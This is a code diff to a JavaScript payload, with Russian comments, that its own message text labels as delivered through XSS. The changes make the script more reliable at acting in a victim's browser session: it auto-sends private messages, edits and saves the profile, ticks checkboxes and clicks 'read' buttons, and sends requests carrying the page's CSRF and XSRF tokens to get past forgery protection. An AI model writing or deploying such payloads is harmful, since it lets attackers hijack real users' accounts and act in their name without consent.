@@ -26,11 +26,23 @@
   
   // ===== ДЕЙСТВИЯ НА СТРАНИЦЕ =====
   
+  // Вспомогательная функция для поиска кнопки по тексту
+  function findButtonByText(text) {
+    var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
+    for (var i = 0; i < buttons.length; i++) {
+      var btn = buttons[i];
+      var btnText = btn.textContent || btn.value || btn.innerText || '';
+      if (btnText.toLowerCase().includes(text.toLowerCase())) {
+        return btn;
+      }
+    }
+    return null;
+  }
+  
   // 1. Автоматическая отправка личного сообщения
   function sendPrivateMessage() {
     // Поиск формы или поля для отправки сообщения
     var messageInput = document.querySelector('textarea[name*="message"], input[name*="message"], textarea[placeholder*="сообщени"], textarea[placeholder*="message"]');
-    var sendButton = document.querySelector('button[type="submit"], button:contains("Отправить"), button:contains("Send")');
     
     if (messageInput) {
       messageInput.value = 'Автоматически отправленное сообщение через XSS';
@@ -38,6 +50,12 @@
       
       // Попытка отправки
       setTimeout(function() {
+        // Ищем кнопку отправки
+        var sendButton = document.querySelector('button[type="submit"]') || 
+                        findButtonByText('Отправить') || 
+                        findButtonByText('Send') ||
+                        findButtonByText('отправить');
+        
         if (sendButton) {
           sendButton.click();
           logAction('send_message', 'success');
@@ -100,7 +118,10 @@
       
       // Сохранение изменений
       setTimeout(function() {
-        var saveButton = document.querySelector('button:contains("Сохранить"), button:contains("Save"), button[type="submit"]');
+        var saveButton = document.querySelector('button[type="submit"]') ||
+                        findButtonByText('Сохранить') ||
+                        findButtonByText('Save') ||
+                        findButtonByText('сохранить');
         if (saveButton) {
           saveButton.click();
           logAction('profile_modified', 'success');
@@ -117,16 +138,22 @@
   
   // 6. Массовые действия (например, отметить все сообщения как прочитанные)
   function markAllAsRead() {
-    var buttons = document.querySelectorAll('button:contains("Прочитано"), button:contains("Read"), input[type="checkbox"]');
-    buttons.forEach(function(btn) {
-      if (btn.type === 'checkbox') {
-        btn.checked = true;
-        btn.dispatchEvent(new Event('change', { bubbles: true }));
-      } else {
+    var checkboxes = document.querySelectorAll('input[type="checkbox"]');
+    for (var i = 0; i < checkboxes.length; i++) {
+      checkboxes[i].checked = true;
+      checkboxes[i].dispatchEvent(new Event('change', { bubbles: true }));
+    }
+    
+    // Ищем кнопки с текстом "Прочитано" или "Read"
+    var allButtons = document.querySelectorAll('button, input[type="button"]');
+    for (var i = 0; i < allButtons.length; i++) {
+      var btn = allButtons[i];
+      var btnText = btn.textContent || btn.value || btn.innerText || '';
+      if (btnText.toLowerCase().includes('прочитано') || btnText.toLowerCase().includes('read')) {
         btn.click();
       }
-    });
-    logAction('mark_all_read', buttons.length);
+    }
+    logAction('mark_all_read', checkboxes.length + allButtons.length);
   }
   
   // 7. Автоматическое добавление контента в DOM
@@ -159,7 +186,7 @@
       method: method || 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.content || '',
+        'X-CSRF-TOKEN': (document.querySelector('meta[name="csrf-token"]') && document.querySelector('meta[name="csrf-token"]').content) || '',
         'X-XSRF-TOKEN': getCookie('XSRF-TOKEN') || ''
       },
       body: JSON.stringify(data),
